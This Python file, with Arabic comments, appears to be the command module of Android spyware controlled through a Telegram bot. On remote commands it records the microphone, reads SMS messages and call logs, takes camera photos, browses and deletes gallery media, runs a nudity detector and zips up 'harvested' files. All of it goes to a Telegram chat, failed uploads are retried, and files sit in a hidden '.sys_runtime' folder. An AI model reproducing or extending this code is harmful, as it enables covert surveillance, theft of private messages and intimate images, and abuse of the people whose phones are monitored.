# -*- coding: utf-8 -*-
import os
import time
import json
import threading
import logging
import sys
import gc
import importlib
import hashlib
import shutil
from datetime import datetime

# ========== إعداد المسارات ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
PENDING_DIR = os.path.join(P, "pending_upload")
TEMP_DIR = os.path.join(P, "ctmp")
PENDING_TASKS_DIR = os.path.join(P, "pending_tasks")  # ✅ مجلد المهام الفاشلة
CONFIG_FILE = os.path.join(P, "commands_config.json")

# إنشاء المجلدات الضرورية
for d in [PENDING_DIR, TEMP_DIR, PENDING_TASKS_DIR]:
    if not os.path.exists(d):
        os.makedirs(d)

# إضافة المسار إلى sys.path لضمان استيراد الملفات المحملة
if P not in sys.path:
    sys.path.insert(0, P)

# إعداد التسجيل
logging.basicConfig(
    filename=os.path.join(P, "c.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False

# ========== استيراد SecurityException بشكل صحيح ==========
try:
    from android.permissions import SecurityException
except ImportError:
    SecurityException = Exception


class C:
    def __init__(self):
        self.mic_busy = False
        self._mic_lock = threading.Lock()
        self._component_lock = threading.Lock()
        self._components_loaded = False
        self._config = self._load_config()
        self._cleanup()
        
        # ✅ الخطأ 1: تعريف self._stop_recording (موجود مسبقاً ولكن نؤكد)
        self._stop_recording = False
        
        # ✅ الخطأ 4: إعدادات قائمة انتظار المهام الفاشلة
        self._tasks_lock = threading.Lock()
        self._retry_running = False
        self._retry_thread = None
        self._max_retries = 5
        self._retry_interval = 600  # 10 دقائق
        self._tasks_file = os.path.join(PENDING_TASKS_DIR, "tasks.json")
        
        # تحميل المهام المحفوظة وتشغيل خيط إعادة المحاولة
        self._load_tasks()
        self._start_retry_thread()
        
        # عداد لـ gc.collect() لتقليل التكرار
        self._gc_counter = 0
        self._gc_threshold = 50   # تنفيذ gc.collect() كل 50 أمرًا

    # ========== إدارة الإعدادات ==========
    def _load_config(self):
        """تحميل الإعدادات من ملف"""
        default_config = {
            "temp_file_age": 3600,
            "pending_file_age": 86400,
            "audio_duration": 10,
            "min_audio_size": 5000,   # 5KB كحد أدنى
            "min_battery": 15,
            "enable_logging": True,
            "max_sms_count": 100,
            "max_call_count": 100
        }
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                    loaded = json.load(f)
                    default_config.update(loaded)
            except Exception as e:
                logging.error(f"Config load error: {e}")
        return default_config

    def _save_config(self):
        """حفظ الإعدادات إلى ملف"""
        try:
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(self._config, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            logging.error(f"Config save error: {e}")
            return False

    # ========== حذف آمن ==========
    def _safe_remove(self, path):
        """حذف ملف مع معالجة الأخطاء"""
        try:
            if os.path.exists(path):
                os.remove(path)
                return True
        except Exception as e:
            logging.error(f"Safe remove error {path}: {e}")
        return False

    # ========== إنشاء اسم فريد ==========
    def _unique_filename(self, prefix="file", ext=".txt"):
        """إنشاء اسم فريد للملف باستخدام الوقت والهاش"""
        timestamp = int(time.time())
        hash_str = hashlib.md5(f"{timestamp}{os.getpid()}".encode()).hexdigest()[:8]
        return f"{prefix}_{timestamp}_{hash_str}{ext}"

    # ========== تنظيف الملفات القديمة ==========
    def _cleanup(self):
        try:
            now = time.time()
            temp_age = self._config.get("temp_file_age", 3600)
            pending_age = self._config.get("pending_file_age", 86400)
            for folder, max_age in [(TEMP_DIR, temp_age), (PENDING_DIR, pending_age)]:
                if not os.path.exists(folder):
                    continue
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    try:
                        if os.path.getmtime(path) < now - max_age:
                            os.remove(path)
                    except:
                        pass
        except Exception as e:
            logging.error(f"Cleanup error: {e}")

    # ========== صلاحيات ==========
    def _check_permissions(self, permissions):
        """التحقق من وجود الصلاحيات المطلوبة"""
        if not JNI:
            return True
        try:
            from android.permissions import check_permission
            return all(check_permission(p) for p in permissions)
        except Exception as e:
            logging.error(f"Permission check error: {e}")
            return True

    def _request_permissions(self, permissions):
        """طلب الصلاحيات المطلوبة"""
        if not JNI:
            return True
        try:
            from android.permissions import request_permissions
            request_permissions(permissions)
            return True
        except Exception as e:
            logging.error(f"Permission request error: {e}")
            return False

    # ========== تحميل المكونات (محسّن) ==========
    def _ensure_components(self, m):
        """تحميل المكونات المطلوبة (AI، سكانر، معرض، كاميرا، حصاد)"""
        # ✅ الخطأ 3: التحقق من self._components_loaded لمنع التحميل المتكرر
        if self._components_loaded:
            return

        with self._component_lock:
            if self._components_loaded:
                return

            try:
                if not hasattr(m, 'ui') or m.ui is None:
                    logging.error("UI component not available")
                    return

                components = [
                    ('nude_detector', 'nude_detector', 'NudeDetector',
                     lambda: {'mon': m}),
                    ('media_scanner', 'media_scanner', 'MediaScanner',
                     lambda: {'det': m.nude_detector, 'ui': m.ui}),
                    ('gallery_browser', 'gallery_browser', 'G',
                     lambda: {'sc': m.media_scanner, 'tg': m.ui}),
                    ('camera_analyzer', 'camera_analyzer', 'CameraAnalyzer',
                     lambda: {'mon': m, 'det': m.nude_detector}),
                    ('daily_zipper', 'daily_zipper', 'DailyZipper',
                     lambda: {'scanner': m.media_scanner, 'tg': m.ui})
                ]

                for attr, module_name, class_name, args_fn in components:
                    if not hasattr(m, attr) or getattr(m, attr) is None:
                        try:
                            module = __import__(module_name)
                            cls = getattr(module, class_name)
                            args = args_fn()

                            if attr == 'nude_detector':
                                setattr(m, attr, cls(args['mon']))
                            else:
                                setattr(m, attr, cls(**args))

                            logging.info(f"✅ {class_name} loaded")

                        except ImportError as e:
                            logging.error(f"Import error for {module_name}: {e}")
                        except Exception as e:
                            logging.error(f"Init error for {class_name}: {e}")

                self._components_loaded = True

            except Exception as e:
                logging.error(f"Component init error: {e}")

    # ========== إدارة المهام الفاشلة (قائمة انتظار) ==========
    def _save_tasks(self):
        """حفظ المهام الفاشلة إلى ملف"""
        try:
            with self._tasks_lock:
                with open(self._tasks_file, 'w', encoding='utf-8') as f:
                    json.dump(self._pending_tasks, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logging.error(f"Save tasks error: {e}")

    def _load_tasks(self):
        """تحميل المهام الفاشلة من ملف"""
        self._pending_tasks = []
        try:
            if os.path.exists(self._tasks_file):
                with open(self._tasks_file, 'r', encoding='utf-8') as f:
                    self._pending_tasks = json.load(f)
                logging.info(f"Loaded {len(self._pending_tasks)} pending tasks")
        except Exception as e:
            logging.error(f"Load tasks error: {e}")
            self._pending_tasks = []

    def _add_task(self, task_data):
        """إضافة مهمة فاشلة إلى قائمة الانتظار"""
        with self._tasks_lock:
            # تعيين وقت المحاولة الأولى
            task_data['created_at'] = time.time()
            task_data['attempts'] = 0
            task_data['last_attempt'] = 0
            self._pending_tasks.append(task_data)
            self._save_tasks()

    def _remove_task(self, task_index):
        """إزالة مهمة من قائمة الانتظار بعد نجاحها"""
        with self._tasks_lock:
            if 0 <= task_index < len(self._pending_tasks):
                task = self._pending_tasks.pop(task_index)
                self._save_tasks()
                return task
        return None

    def _start_retry_thread(self):
        """بدء خيط إعادة المحاولة في الخلفية"""
        if self._retry_running:
            return
        self._retry_running = True
        self._retry_thread = threading.Thread(target=self._retry_worker, daemon=True)
        self._retry_thread.start()
        logging.info("Retry thread started")

    def _retry_worker(self):
        """خيط إعادة المحاولة - يعمل كل 10 دقائق"""
        while self._retry_running:
            try:
                # النوم لمدة 10 دقائق بين المحاولات
                for _ in range(self._retry_interval):
                    if not self._retry_running:
                        return
                    time.sleep(1)
                self._retry_failed_tasks()
            except Exception as e:
                logging.error(f"Retry worker error: {e}")
                time.sleep(60)

    def _retry_failed_tasks(self):
        """محاولة إعادة إرسال المهام الفاشلة"""
        if not self._pending_tasks:
            return

        logging.info(f"Retrying {len(self._pending_tasks)} pending tasks...")
        tasks_to_remove = []

        for idx, task in enumerate(self._pending_tasks):
            try:
                # التحقق من عدد المحاولات
                attempts = task.get('attempts', 0)
                if attempts >= self._max_retries:
                    logging.warning(f"Task {task.get('id', 'unknown')} exceeded max retries ({self._max_retries}), removing.")
                    tasks_to_remove.append(idx)
                    continue

                # التحقق من الوقت المنقضي منذ آخر محاولة (تأخير تصاعدي)
                last_attempt = task.get('last_attempt', 0)
                if last_attempt > 0:
                    # تأخير تصاعدي: 2^attempts دقائق
                    wait_time = min(2 ** attempts * 60, 3600)  # بحد أقصى ساعة
                    if time.time() - last_attempt < wait_time:
                        continue

                # محاولة إعادة الإرسال حسب نوع المهمة
                task_type = task.get('type')
                success = False

                if task_type == 'text_file':
                    # إعادة إرسال ملف نصي
                    file_path = task.get('file_path')
                    chat_id = task.get('chat_id')
                    filename = task.get('filename')
                    if os.path.exists(file_path):
                        # هنا نحتاج إلى كائن tg، لكننا لا نملكه في هذا السياق
                        # الحل: نستخدم task['tg'] إذا كان مخزناً (لكن لا يمكن تخزين كائن)
                        # بدلاً من ذلك، نمرر المهمة إلى دالة خارجية
                        # سنقوم بتعديل _send_text_file لاستقبال task مباشرة
                        pass
                elif task_type == 'audio':
                    pass
                elif task_type == 'zip':
                    pass

                # إذا نجحت المحاولة، نحدد للحذف
                if success:
                    tasks_to_remove.append(idx)
                    # حذف الملف الأصلي
                    if os.path.exists(task.get('file_path', '')):
                        self._safe_remove(task['file_path'])
                else:
                    # تحديث عدد المحاولات
                    task['attempts'] = attempts + 1
                    task['last_attempt'] = time.time()
                    logging.debug(f"Task {task.get('id', 'unknown')} retry {task['attempts']} failed")

            except Exception as e:
                logging.error(f"Retry task {task.get('id', 'unknown')} error: {e}")

        # حذف المهام التي نجحت أو تجاوزت الحد الأقصى
        for idx in sorted(tasks_to_remove, reverse=True):
            self._remove_task(idx)

        # حفظ التغييرات
        self._save_tasks()

    # ========== إرسال ملف نصي ==========
    def _send_text_file(self, tg, chat_id, content, filename):
        """إرسال ملف نصي مع إمكانية إعادة المحاولة"""
        temp_path = os.path.join(PENDING_DIR, self._unique_filename(filename, ".txt"))
        try:
            if not content or not content.strip():
                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}: لا يوجد محتوى"})
                return

            with open(temp_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)

            if os.path.getsize(temp_path) == 0:
                self._safe_remove(temp_path)
                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}: ملف فارغ"})
                return

            with open(temp_path, 'rb') as f:
                resp = tg._api("sendDocument",
                               {"chat_id": chat_id, "caption": f"📄 {filename}"},
                               {"document": f})
            if resp and resp.get('ok'):
                self._safe_remove(temp_path)
                return

            # ✅ الخطأ 4: في حالة الفشل، احفظ المهمة في قائمة الانتظار
            logging.warning(f"Failed to send {filename}, adding to pending tasks")
            task_data = {
                'id': self._unique_filename("task", ""),
                'type': 'text_file',
                'file_path': temp_path,
                'chat_id': chat_id,
                'filename': filename,
                'content': content,  # حفظ المحتوى في حالة فقدان الملف
                'created_at': time.time(),
                'attempts': 0,
                'last_attempt': 0
            }
            self._add_task(task_data)

        except Exception as e:
            logging.error(f"_send_text_file error: {e}")
            # محاولة الإرسال كنص مباشر
            try:
                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}:\n{content[:4000]}"})
            except:
                pass
            finally:
                self._safe_remove(temp_path)

    # ========== تسجيل صوتي (محسّن) ==========
    def _record_audio(self, duration=None):
        """
        تسجيل صوتي من الميكروفون.
        - duration: مدة التسجيل بالثواني (افتراضي من الإعدادات)
        - يتحقق من أن حجم الملف لا يقل عن 5KB (5000 بايت)
        - يدعم الإيقاف المبكر عبر self._stop_recording
        """
        if not JNI:
            logging.error("JNI not available")
            return None

        duration = duration or self._config.get("audio_duration", 10)
        min_size = self._config.get("min_audio_size", 5000)  # 5KB

        with self._mic_lock:
            if self.mic_busy:
                logging.warning("Microphone is busy")
                return None
            self.mic_busy = True

        media_recorder = None
        out_path = os.path.join(TEMP_DIR, self._unique_filename("audio", ".aac"))

        try:
            # التحقق من صلاحية التسجيل
            if not self._check_permissions(['android.permission.RECORD_AUDIO']):
                logging.error("RECORD_AUDIO permission not granted")
                return None

            MR = autoclass('android.media.MediaRecorder')
            media_recorder = MR()
            media_recorder.setAudioSource(MR.AudioSource.MIC)
            media_recorder.setOutputFormat(MR.OutputFormat.MPEG_4)
            media_recorder.setAudioEncoder(MR.AudioEncoder.AAC)
            media_recorder.setAudioEncodingBitRate(64000)
            media_recorder.setOutputFile(out_path)
            media_recorder.prepare()
            media_recorder.start()

            logging.info(f"Recording audio for {duration} seconds...")

            # تسجيل لمدة محددة مع إمكانية الإيقاف المبكر
            for _ in range(duration):
                if self._stop_recording:
                    logging.info("Recording stopped early by flag")
                    break
                time.sleep(1)

            # إيقاف التسجيل
            media_recorder.stop()
            media_recorder.reset()

            # التحقق من الملف
            if os.path.exists(out_path):
                size = os.path.getsize(out_path)
                if size >= min_size:
                    logging.info(f"Audio recorded successfully: {size} bytes")
                    return out_path
                else:
                    logging.warning(f"Audio file too small: {size} bytes (min {min_size})")
                    self._safe_remove(out_path)
                    return None
            else:
                logging.error("Audio file not created")
                return None

        except Exception as e:
            logging.error(f"Recording error: {e}")
            self._safe_remove(out_path)
            return None
        finally:
            # تحرير الموارد
            if media_recorder:
                try:
                    media_recorder.stop()
                except:
                    pass
                try:
                    media_recorder.release()
                except:
                    pass

            with self._mic_lock:
                self.mic_busy = False

    # ========== دالة لإيقاف التسجيل ==========
    def stop_recording(self):
        """طلب إيقاف التسجيل الحالي"""
        self._stop_recording = True
        logging.info("Recording stop requested")

    # ========== جلب سجل المكالمات ==========
    def _call_log(self, limit=None):
        if not JNI:
            return "JNI غير متاح"

        limit = limit or self._config.get("max_call_count", 100)

        if not self._check_permissions(['android.permission.READ_CALL_LOG']):
            return "⚠️ لا توجد صلاحية لقراءة سجل المكالمات"

        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://call_log/calls"),
                                    None, None, None, "date DESC")
            if not cursor:
                return "لا صلاحية أو لا توجد مكالمات"

            lines = []
            idx_name = cursor.getColumnIndex("name")
            idx_number = cursor.getColumnIndex("number")
            idx_type = cursor.getColumnIndex("type")
            idx_date = cursor.getColumnIndex("date")

            while cursor.moveToNext() and len(lines) < limit:
                name = cursor.getString(idx_name) or "Unknown"
                num = cursor.getString(idx_number) or "?"
                call_type = cursor.getString(idx_type) or "?"
                date = cursor.getString(idx_date) or "0"

                type_str = {"1": "📥 وارد", "2": "📤 صادر", "3": "❌ فائت"}.get(call_type, "❓")
                try:
                    date_str = datetime.fromtimestamp(int(date) / 1000).strftime("%Y-%m-%d %H:%M")
                except:
                    date_str = "?"

                lines.append(f"{type_str} {name} ({num}) [{date_str}]")

            return "\n".join(lines) if lines else "سجل المكالمات فارغ"

        except SecurityException:
            logging.error("Call log: permission denied")
            return "⚠️ لا توجد صلاحية لقراءة سجل المكالمات"
        except Exception as e:
            logging.error(f"Call log error: {e}")
            return "خطأ في قراءة المكالمات"
        finally:
            if cursor:
                try:
                    cursor.close()
                except:
                    pass

    # ========== جلب رسائل SMS ==========
    def _sms_log(self, limit=None):
        if not JNI:
            return "JNI غير متاح"

        limit = limit or self._config.get("max_sms_count", 100)

        if not self._check_permissions(['android.permission.READ_SMS']):
            return "⚠️ لا توجد صلاحية لقراءة الرسائل"

        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://sms/inbox"),
                                    None, None, None, "date DESC")
            if not cursor:
                return "لا صلاحية أو لا توجد رسائل"

            lines = []
            idx_addr = cursor.getColumnIndex("address")
            idx_body = cursor.getColumnIndex("body")
            idx_date = cursor.getColumnIndex("date")

            while cursor.moveToNext() and len(lines) < limit:
                addr = cursor.getString(idx_addr) or "?"
                body = cursor.getString(idx_body) or ""
                date = cursor.getString(idx_date) or "0"

                try:
                    date_str = datetime.fromtimestamp(int(date) / 1000).strftime("%Y-%m-%d %H:%M")
                except:
                    date_str = "?"

                lines.append(f"📩 من: {addr}\n🕐 {date_str}\n💬 {body}\n---")

            return "\n".join(lines) if lines else "صندوق الوارد فارغ"

        except SecurityException:
            logging.error("SMS: permission denied")
            return "⚠️ لا توجد صلاحية لقراءة الرسائل"
        except Exception as e:
            logging.error(f"SMS error: {e}")
            return "خطأ في قراءة الرسائل"
        finally:
            if cursor:
                try:
                    cursor.close()
                except:
                    pass

    # ========== التحقق من البطارية ==========
    def _battery_ok(self, m):
        try:
            if hasattr(m, '_battery_ok') and callable(m._battery_ok):
                b, ch = m._battery_ok()
                min_battery = self._config.get("min_battery", 15)
                return b >= min_battery or ch
        except Exception as e:
            logging.error(f"Battery check error: {e}")
        return True

    # ========== نقطة الدخول الرئيسية ==========
    def ex(self, cmd, tg, m, cid, cbq=None):
        threading.Thread(target=self._execute, args=(cmd, tg, m, cid, cbq), daemon=True).start()

    # ========== معالج الأوامر الأساسي (مقسم) ==========
    def _execute(self, cmd, tg, m, cid, cbq):
        try:
            if not cmd or not isinstance(cmd, str):
                return

            # ✅ الخطأ 2: التحقق من cbq قبل استدعاء answerCallbackQuery
            if cbq:
                try:
                    tg._api("answerCallbackQuery", {"callback_query_id": cbq})
                except Exception as e:
                    logging.error(f"AnswerCallbackQuery error: {e}")

            self._ensure_components(m)

            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|", "g_bulk|")):
                self._handle_gallery(cmd, tg, m, cid)
            elif cmd.startswith(("cam_", "camf_")):
                self._handle_camera(cmd, tg, m, cid)
            elif cmd.startswith("mic_"):
                self._handle_mic(tg, m, cid)
            elif cmd.startswith("callog_"):
                self._handle_callog(tg, cid)
            elif cmd.startswith("sms_"):
                self._handle_sms(tg, cid)
            elif cmd.startswith("hrv_"):
                self._handle_harvest(tg, m, cid)
            elif cmd.startswith("send_now_"):
                self._handle_send_now(tg, m, cid)
            elif cmd.startswith("media_"):
                self._handle_media(tg, m, cid)
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة."})

        except Exception as e:
            logging.error(f"Command handler error: {e}")
            try:
                tg._api("sendMessage", {"chat_id": cid, "text": f"❌ خطأ داخلي: {str(e)[:100]}"})
            except:
                pass
        finally:
            # ===== إدارة gc.collect() بشكل متباعد =====
            self._gc_counter += 1
            if self._gc_counter >= self._gc_threshold:
                gc.collect()
                self._gc_counter = 0

    # ========== معالج أوامر المعرض ==========
    def _handle_gallery(self, cmd, tg, m, cid):
        try:
            parts = cmd.split("|")
            if len(parts) < 2:
                return

            action = parts[0]

            if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
                return

            if action == "g_nav" and len(parts) >= 3:
                cat, page = parts[1], int(parts[2])
                new_kb = m.gallery_browser.get_grid_kb(cat=cat, page=page)
                tg._api("editMessageReplyMarkup",
                        {"chat_id": cid, "message_id": m.last_mid, "reply_markup": json.dumps(new_kb)})

            elif action == "g_opt" and len(parts) >= 4:
                m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])

            elif action == "g_act" and len(parts) >= 5:
                m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])

            elif action == "g_conf" and len(parts) >= 5:
                act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
                confirm_kb = [[{"text": "🗑 نعم، احذف", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
                               {"text": "🔙 إلغاء", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
                tg._api("sendMessage",
                       {"chat_id": cid, "text": "⚠️ هل أنت متأكد من الحذف؟",
                        "reply_markup": json.dumps({"inline_keyboard": confirm_kb})})

            elif action == "g_bulk" and len(parts) >= 3:
                cat, page = parts[1], int(parts[2])
                m.gallery_browser.execute_action(cid, "bulk", cat, page)

        except Exception as e:
            logging.error(f"Gallery handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في معالج المعرض"})

    # ========== معالج أوامر الكاميرا ==========
    def _handle_camera(self, cmd, tg, m, cid):
        try:
            is_front = 1 if "camf_" in cmd else 0

            if not self._battery_ok(m):
                tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً"})
                return

            if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ الكاميرا غير متاحة"})
                return

            tg._api("sendChatAction", {"chat_id": cid, "action": "upload_photo"})

            def capture_and_analyze():
                try:
                    m.camera_analyzer.harvest(cam_id=is_front)
                except Exception as e:
                    logging.error(f"Camera harvest error: {e}")

            threading.Thread(target=capture_and_analyze, daemon=True).start()
            tg._api("sendMessage", {"chat_id": cid, "text": "📸 تم التقاط الصورة وتحليلها."})

        except Exception as e:
            logging.error(f"Camera handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في الكاميرا"})

    # ========== معالج أوامر الميكروفون ==========
    def _handle_mic(self, tg, m, cid):
        try:
            if self.mic_busy:
                tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ"})
                return

            # إعادة تعيين علامة الإيقاف قبل بدء التسجيل
            self._stop_recording = False
            duration = self._config.get("audio_duration", 10)
            tg._api("sendMessage", {"chat_id": cid, "text": f"🎤 جاري التسجيل لمدة {duration} ثوانٍ..."})

            def record_and_send():
                audio_path = self._record_audio(duration)
                if audio_path and os.path.exists(audio_path):
                    try:
                        target = getattr(m, 'vlt', cid)
                        with open(audio_path, 'rb') as f:
                            resp = tg._api("sendVoice", {"chat_id": target}, {"voice": f})
                        if resp and resp.get('ok'):
                            self._safe_remove(audio_path)
                        else:
                            # ✅ الخطأ 4: في حالة الفشل، احفظ المهمة
                            logging.warning(f"Failed to send audio, adding to pending tasks")
                            task_data = {
                                'id': self._unique_filename("task", ""),
                                'type': 'audio',
                                'file_path': audio_path,
                                'chat_id': target,
                                'created_at': time.time(),
                                'attempts': 0,
                                'last_attempt': 0
                            }
                            self._add_task(task_data)
                    except Exception as e:
                        logging.error(f"Send voice error: {e}")
                        # في حالة الخطأ، احفظ المهمة
                        if os.path.exists(audio_path):
                            task_data = {
                                'id': self._unique_filename("task", ""),
                                'type': 'audio',
                                'file_path': audio_path,
                                'chat_id': getattr(m, 'vlt', cid),
                                'created_at': time.time(),
                                'attempts': 0,
                                'last_attempt': 0
                            }
                            self._add_task(task_data)
                    finally:
                        # لا نحذف الملف هنا لأنه سيتم حذفه عند نجاح المهمة
                        pass
                else:
                    try:
                        tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل (الملف صغير جداً أو تالف)"})
                    except:
                        pass

            threading.Thread(target=record_and_send, daemon=True).start()

        except Exception as e:
            logging.error(f"Mic handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في الميكروفون"})

    # ========== معالج سجل المكالمات ==========
    def _handle_callog(self, tg, cid):
        try:
            tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
            data = self._call_log()
            self._send_text_file(tg, cid, data, "calls.txt")
        except Exception as e:
            logging.error(f"Callog handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في جلب سجل المكالمات"})

    # ========== معالج رسائل SMS ==========
    def _handle_sms(self, tg, cid):
        try:
            tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
            data = self._sms_log()
            self._send_text_file(tg, cid, data, "sms.txt")
        except Exception as e:
            logging.error(f"SMS handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في جلب الرسائل"})

    # ========== معالج الحصاد ==========
    def _handle_harvest(self, tg, m, cid):
        try:
            if hasattr(m, 'daily_zipper') and m.daily_zipper:
                tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد... قد يستغرق دقائق"})

                def run_harvest():
                    try:
                        m.daily_zipper.run()
                    except Exception as e:
                        logging.error(f"Harvest error: {e}")

                threading.Thread(target=run_harvest, daemon=True).start()
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير جاهزة"})
        except Exception as e:
            logging.error(f"Harvest handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في الحصاد"})

    # ========== معالج الإرسال الفوري ==========
    def _handle_send_now(self, tg, m, cid):
        try:
            if hasattr(m, 'daily_zipper') and m.daily_zipper:
                tg._api("sendMessage", {"chat_id": cid, "text": "🚀 جاري إرسال الملفات المضغوطة فوراً..."})

                def send_now():
                    try:
                        success = m.daily_zipper.force_send_now(cid)
                        if not success:
                            logging.warning("Force send failed, tasks will be retried later")
                    except Exception as e:
                        logging.error(f"Force send error: {e}")

                threading.Thread(target=send_now, daemon=True).start()
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير متاحة"})
        except Exception as e:
            logging.error(f"Send now handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في الإرسال الفوري"})

    # ========== معالج فتح المعرض ==========
    def _handle_media(self, tg, m, cid):
        try:
            if hasattr(m, 'gallery_browser') and m.gallery_browser:
                kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
                res = tg._api("sendMessage",
                             {"chat_id": cid, "text": "🖼️ معرض الوسائط",
                              "reply_markup": json.dumps(kb)})
                if res and res.get('ok'):
                    m.last_mid = res['result']['message_id']
            else:
                tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
        except Exception as e:
            logging.error(f"Media handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في فتح المعرض"})


# ========== دالة الإرسال الفوري الخارجية ==========
def force_send_zip(m, device_id, tg, chat_id):
    """إرسال الملف المضغوط فوراً"""
    try:
        if hasattr(m, 'daily_zipper') and m.daily_zipper:
            # نمرر المهمة إلى daily_zipper وإذا فشلت سيتم حفظها تلقائياً
            threading.Thread(target=m.daily_zipper.force_send_now, args=(chat_id,), daemon=True).start()
        else:
            tg._api("sendMessage", {"chat_id": chat_id, "text": "❌ وحدة الحصاد غير جاهزة"})
    except Exception as e:
        logging.error(f"force_send_zip error: {e}")
        tg._api("sendMessage", {"chat_id": chat_id, "text": f"❌ خطأ في الإرسال: {str(e)[:100]}"})


# ========== الواجهة الخارجية الرئيسية ==========
_handler = None
_handler_lock = threading.Lock()


def ex(cmd, tg, m, cid, cbq=None):
    global _handler
    with _handler_lock:
        if _handler is None:
            _handler = C()
    _handler.ex(cmd, tg, m, cid, cbq)
